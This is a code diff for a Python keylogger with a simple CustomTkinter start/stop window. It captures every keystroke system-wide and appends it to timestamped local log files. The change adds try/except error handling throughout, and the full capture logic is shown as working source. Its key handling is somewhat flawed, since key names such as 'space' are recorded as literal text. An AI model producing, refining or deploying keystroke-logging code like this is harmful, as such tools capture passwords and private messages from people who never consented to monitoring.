@@ -2,6 +2,7 @@ import keyboard  # Library to handle keyboard events
 import time
 from datetime import datetime
 import customtkinter as ctk  # CustomTkinter for a modern GUI
+from tkinter import messagebox  # For displaying error messages
 
 # Keylogger class
 class Keylogger:
@@ -16,31 +17,43 @@ class Keylogger:
         return f"keylog_{now.strftime('%Y%m%d_%H%M%S')}.txt"
 
     def on_key_press(self, event):
-        if self.is_logging:
-            self.current_line += event.name  # Add the pressed key to the current line
-            # If "space" or "enter" is pressed, write the line to the file
-            if event.name == "space":
-                self.current_line += " "
-            elif event.name == "enter":
-                self.current_line += "\n"  # New line when "Enter" is pressed
-                self._write_to_file()
-            elif event.name == "backspace":
-                self.current_line = self.current_line[:-1]  # Remove the last character
+        try:
+            if self.is_logging:
+                self.current_line += event.name  # Add the pressed key to the current line
+                # If "space" or "enter" is pressed, write the line to the file
+                if event.name == "space":
+                    self.current_line += " "
+                elif event.name == "enter":
+                    self.current_line += "\n"  # New line when "Enter" is pressed
+                    self._write_to_file()
+                elif event.name == "backspace":
+                    self.current_line = self.current_line[:-1]  # Remove the last character
+        except Exception as e:
+            print(f"Error in on_key_press: {e}")  # Log the error to the console
 
     def _write_to_file(self):
-        with open(self.log_file, "a") as f:
-            f.write(self.current_line)
-        self.current_line = ""  # Reset the current line
+        try:
+            with open(self.log_file, "a") as f:
+                f.write(self.current_line)
+            self.current_line = ""  # Reset the current line
+        except Exception as e:
+            print(f"Error writing to file: {e}")  # Log the error to the console
 
     def start(self):
-        self.is_logging = True
-        keyboard.on_press(self.on_key_press)
+        try:
+            self.is_logging = True
+            keyboard.on_press(self.on_key_press)
+        except Exception as e:
+            print(f"Error starting keylogger: {e}")  # Log the error to the console
 
     def stop(self):
-        self.is_logging = False
-        keyboard.unhook_all()
-        if self.current_line:  # Write any remaining content when stopping
-            self._write_to_file()
+        try:
+            self.is_logging = False
+            keyboard.unhook_all()
+            if self.current_line:  # Write any remaining content when stopping
+                self._write_to_file()
+        except Exception as e:
+            print(f"Error stopping keylogger: {e}")  # Log the error to the console
 
 # GUI class with CustomTkinter
 class KeyloggerApp(ctk.CTk):
@@ -71,18 +84,27 @@ class KeyloggerApp(ctk.CTk):
         self.exit_button.pack(pady=20)
 
     def start_keylogger(self):
-        self.keylogger.start()
-        self.status_label.configure(text="Status: Running", text_color="green")
-        self.start_button.configure(state="disabled")
-        self.stop_button.configure(state="normal")
+        try:
+            self.keylogger.start()
+            self.status_label.configure(text="Status: Running", text_color="green")
+            self.start_button.configure(state="disabled")
+            self.stop_button.configure(state="normal")
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to start keylogger: {e}")  # Show error message
 
     def stop_keylogger(self):
-        self.keylogger.stop()
-        self.status_label.configure(text="Status: Stopped", text_color="red")
-        self.start_button.configure(state="normal")
-        self.stop_button.configure(state="disabled")
+        try:
+            self.keylogger.stop()
+            self.status_label.configure(text="Status: Stopped", text_color="red")
+            self.start_button.configure(state="normal")
+            self.stop_button.configure(state="disabled")
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to stop keylogger: {e}")  # Show error message
 
 # Run the application
 if __name__ == "__main__":
-    app = KeyloggerApp()
-    app.mainloop()
+    try:
+        app = KeyloggerApp()
+        app.mainloop()
+    except Exception as e:
+        print(f"Application error: {e}")  # Log the error to the console
